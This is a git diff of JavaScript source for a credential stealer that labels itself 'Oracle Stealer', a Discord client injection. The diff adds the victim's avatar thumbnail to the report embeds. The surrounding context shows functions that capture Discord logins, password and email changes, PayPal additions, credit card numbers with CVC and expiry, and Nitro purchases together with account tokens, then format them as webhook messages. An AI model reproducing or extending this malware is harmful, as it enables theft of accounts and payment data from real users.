@@ -384,6 +384,9 @@ const login = async (email, password, token) => {
           name: "Oracle Stealer",
           icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
         footer: {
           text: "@Rdimo#6969",
         },
@@ -446,6 +449,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           name: "Oracle Stealer",
           icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
         footer: {
           text: "@Rdimo#6969",
         },
@@ -502,6 +508,9 @@ const emailChanged = async (email, password, token) => {
         author: {
           name: "Oracle Stealer",
           icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
+        },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: "@Rdimo#6969",
@@ -560,6 +569,9 @@ const PaypalAdded = async (email, password, token) => {
           name: "Oracle Stealer",
           icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
         footer: {
           text: "@Rdimo#6969",
         },
@@ -617,6 +629,9 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           name: "Oracle Stealer",
           icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
         footer: {
           text: "@Rdimo#6969",
         },
@@ -660,6 +675,9 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
